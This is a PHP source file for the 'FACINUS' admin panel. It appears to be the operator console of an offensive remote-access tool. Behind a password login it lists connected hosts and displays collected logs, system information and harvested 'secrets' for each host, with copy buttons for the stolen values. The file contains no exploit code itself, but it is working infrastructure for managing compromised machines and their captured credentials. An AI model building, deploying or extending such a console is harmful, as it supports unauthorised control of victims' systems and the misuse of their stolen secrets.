<?php
// FACINUS Admin Panel
session_start();
$admin_password = "ADMIN_PASSWORD_PLACEHOLDER"; // Will be replaced during installation

// Handle login/logout
if (isset($_POST['password'])) {
    if ($_POST['password'] === $admin_password) {
        $_SESSION['authenticated'] = true;
    } else {
        $login_error = "Invalid password";
    }
}

if (isset($_GET['logout'])) {
    session_destroy();
    header("Location: " . $_SERVER['PHP_SELF']);
    exit;
}

// Check authentication
$authenticated = isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true;

// Directories
$logs_dir = __DIR__ . "/logs";
$secrets_dir = __DIR__ . "/secrets";

// Get list of hosts
$hosts = [];
if ($authenticated && is_dir($logs_dir)) {
    $dir_content = scandir($logs_dir);
    foreach ($dir_content as $item) {
        if ($item != "." && $item != ".." && is_dir($logs_dir . "/" . $item)) {
            $hosts[] = $item;
        }
    }
}

// View specific log if requested
$current_log = null;
$log_content = "";
if ($authenticated && isset($_GET['log']) && isset($_GET['host'])) {
    // Fix path traversal by sanitizing inputs
    $host = basename($_GET['host']);
    $log = basename($_GET['log']);
    $log_path = $logs_dir . "/" . $host . "/" . $log;
    if (file_exists($log_path) && is_file($log_path)) {
        $current_log = $log;
        $log_content = file_get_contents($log_path);
    }
}

// View system info if requested
$system_info = null;
if ($authenticated && isset($_GET['info']) && $_GET['info'] === 'system' && isset($_GET['host'])) {
    $host = basename($_GET['host']);
    $info_path = $logs_dir . "/" . $host . "/system_info.json";
    if (file_exists($info_path) && is_file($info_path)) {
        $system_info = json_decode(file_get_contents($info_path), true);
    }
}

// View secrets if requested
$secrets = [];
if ($authenticated && isset($_GET['secrets']) && isset($_GET['host'])) {
    $host = basename($_GET['host']);
    $host_secrets_dir = $secrets_dir . "/" . $host;
    if (is_dir($host_secrets_dir)) {
        $secret_files = scandir($host_secrets_dir);
        foreach ($secret_files as $file) {
            if ($file != "." && $file != ".." && is_file($host_secrets_dir . "/" . $file)) {
                $type = pathinfo($file, PATHINFO_FILENAME);
                $value = file_get_contents($host_secrets_dir . "/" . $file);
                $secrets[$type] = $value;
            }
        }
    }
}

$host_logs = [];
if ($authenticated && isset($_GET['host'])) {
    $host = basename($_GET['host']);
    $host_logs_dir = $logs_dir . "/" . $host;
    if (is_dir($host_logs_dir)) {
        $log_files = scandir($host_logs_dir);
        foreach ($log_files as $file) {
            if ($file != "." && $file != ".." && is_file($host_logs_dir . "/" . $file)) {
                $host_logs[] = $file;
            }
        }
        // Sort logs by most recent first
        usort($host_logs, function($a, $b) use ($host_logs_dir) {
            $file_b = $host_logs_dir . "/" . $b;
            $file_a = $host_logs_dir . "/" . $a;
            
            $time_b = file_exists($file_b) ? filemtime($file_b) : 0;
            $time_a = file_exists($file_a) ? filemtime($file_a) : 0;
            
            return $time_b - $time_a;
        });
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>FACINUS - Admin</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <a href="admin.php" class="logo">
                <pre class="ascii-header">
  █████▒▄▄▄       ▄████▄   ██▓ ███▄    █  █    ██   ██████ 
▓██   ▒▒████▄    ▒██▀ ▀█  ▓██▒ ██ ▀█   █  ██  ▓██▒▒██    ▒ 
▒████ ░▒██  ▀█▄  ▒▓█    ▄ ▒██▒▓██  ▀█ ██▒▓██  ▒██░░ ▓██▄   
░▓█▒  ░░██▄▄▄▄██ ▒▓▓▄ ▄██▒░██░▓██▒  ▐▌██▒▓▓█  ░██░  ▒   ██▒
░▒█░    ▓█   ▓██▒▒ ▓███▀ ░░██░▒██░   ▓██░▒▒█████▓ ▒██████▒▒
 ▒ ░    ▒▒   ▓▒█░░ ░▒ ▒  ░░▓  ░ ▒░   ▒ ▒ ░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░       ▒   ▒▒ ░  ░  ▒    ▒ ░░ ░░   ░ ▒░░░▒░ ░ ░ ░ ░▒  ░ ░
 ░ ░     ░   ▒   ░         ▒ ░   ░   ░ ░  ░░░ ░ ░ ░  ░  ░  
             ░  ░░ ░       ░           ░    ░           ░  
                 ░                                         
 admin panel
                </pre>
            </a>
            <?php if ($authenticated): ?>
                <a href="?logout=1" class="logout">logout</a>
            <?php endif; ?>
        </div>

        <?php if (!$authenticated): ?>
            <div class="login">
                <h2>> login</h2>
                <?php if (isset($login_error)): ?>
                    <div class="alert"><?php echo $login_error; ?></div>
                <?php endif; ?>
                <form method="post">
                    <label for="password">password:</label>
                    <input type="password" id="password" name="password" required autofocus>
                    <button type="submit">access</button>
                </form>
            </div>
        <?php else: ?>
            <div class="dashboard">
                <div class="sidebar">
                    <div class="panel">
                        <div class="panel-header">
                            <h3>> hosts</h3>
                        </div>
                        <?php if (count($hosts) > 0): ?>
                            <input type="text" id="hostSearch" placeholder="search..." class="search-box">
                            <ul class="host-list">
                                <?php foreach ($hosts as $host): ?>
                                    <li>
                                        <a href="?host=<?php echo urlencode($host); ?>" class="<?php echo isset($_GET['host']) && $_GET['host'] === $host ? 'active' : ''; ?>">
                                            <?php echo htmlspecialchars($host); ?>
                                        </a>
                                    </li>
                                <?php endforeach; ?>
                            </ul>
                        <?php else: ?>
                            <div class="welcome">
                                <p>no connected hosts</p>
                            </div>
                        <?php endif; ?>
                    </div>
                </div>
                
                <div class="content">
                    <?php if (isset($_GET['host'])): ?>
                        <div class="panel">
                            <div class="panel-header">
                                <h2>> <?php echo htmlspecialchars(basename($_GET['host'])); ?></h2>
                                <?php if ($current_log): ?>
                                    <button class="action-btn" id="downloadBtn">download</button>
                                    <button class="action-btn" id="refreshBtn">refresh</button>
                                <?php endif; ?>
                            </div>
                            
                            <div class="tabs">
                                <a href="?host=<?php echo urlencode(basename($_GET['host'])); ?>" class="tab <?php echo !isset($_GET['info']) && !isset($_GET['secrets']) ? 'active' : ''; ?>">
                                    logs
                                </a>
                                <a href="?host=<?php echo urlencode(basename($_GET['host'])); ?>&info=system" class="tab <?php echo isset($_GET['info']) && $_GET['info'] === 'system' ? 'active' : ''; ?>">
                                    system
                                </a>
                                <a href="?host=<?php echo urlencode(basename($_GET['host'])); ?>&secrets=1" class="tab <?php echo isset($_GET['secrets']) ? 'active' : ''; ?>">
                                    secrets
                                </a>
                            </div>
                            
                            <?php if (isset($_GET['secrets'])): ?>
                                <div class="secrets">
                                    <?php if (count($secrets) > 0): ?>
                                        <?php foreach ($secrets as $type => $value): ?>
                                            <div class="secret">
                                                <div class="secret-title">
                                                    > <?php echo htmlspecialchars(str_replace('_', ' ', $type)); ?>
                                                </div>
                                                <div class="command">
                                                    <div class="secret-content">
                                                        <?php echo htmlspecialchars($value); ?>
                                                    </div>
                                                    <button class="copy-btn" data-clipboard="<?php echo htmlspecialchars($value); ?>">
                                                        copy
                                                    </button>
                                                </div>
                                            </div>
                                        <?php endforeach; ?>
                                    <?php else: ?>
                                        <div class="welcome">
                                            <p>no secrets collected from this host</p>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            <?php elseif (isset($_GET['info']) && $_GET['info'] === 'system'): ?>
                                <div class="system-info">
                                    <?php if ($system_info): ?>
                                        <table class="info-table">
                                            <?php foreach ($system_info as $key => $value): ?>
                                                <tr>
                                                    <td class="info-label"><?php echo htmlspecialchars(str_replace('_', ' ', $key)); ?></td>
                                                    <td><?php echo htmlspecialchars($value); ?></td>
                                                </tr>
                                            <?php endforeach; ?>
                                        </table>
                                    <?php else: ?>
                                        <div class="welcome">
                                            <p>no system information collected</p>
                                        </div>
                                    <?php endif; ?>
                                </div>
                            <?php else: ?>
                                <?php if ($current_log): ?>
                                    <div class="logs">
                                        <?php echo htmlspecialchars($log_content); ?>
                                    </div>
                                <?php elseif (count($host_logs) > 0): ?>
                                    <input type="text" id="logSearch" placeholder="search..." class="search-box">
                                    <ul class="log-list">
                                        <?php foreach ($host_logs as $log_file): ?>
                                            <?php 
                                                $host = basename($_GET['host']);
                                                $log_time = filemtime($logs_dir . "/" . $host . "/" . $log_file);
                                                $log_date = date("Y-m-d H:i:s", $log_time);
                                            ?>
                                            <li>
                                                <a href="?host=<?php echo urlencode($host); ?>&log=<?php echo urlencode($log_file); ?>">
                                                    <?php echo htmlspecialchars($log_file); ?>
                                                    <span class="log-date"><?php echo $log_date; ?></span>
                                                </a>
                                            </li>
                                        <?php endforeach; ?>                                    </ul>
                                <?php else: ?>
                                    <div class="welcome">
                                        <p>no logs available</p>
                                    </div>
                                <?php endif; ?>
                            <?php endif; ?>
                        </div>
                    <?php else: ?>
                        <div class="welcome">
                            <p>select a host to view details</p>
                        </div>
                    <?php endif; ?>
                </div>
            </div>
        <?php endif; ?>
    </div>

    <script src="scripts.js"></script>
</body>
</html>
